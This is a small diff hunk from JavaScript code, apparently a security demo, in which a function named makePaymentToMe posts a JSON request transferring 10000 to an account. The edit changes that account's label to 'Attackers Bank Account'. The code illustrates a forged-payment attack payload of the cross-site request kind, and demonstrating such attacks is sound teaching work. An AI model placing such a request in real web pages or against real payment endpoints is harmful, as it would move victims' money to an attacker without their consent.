@@ -38,7 +38,7 @@ function makePaymentToMe() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      account: 'To Bruno Antunes LOL',
+      account: 'Attackers Bank Account',
       amount: 10000,
     }),
   }).then(j => j.json());
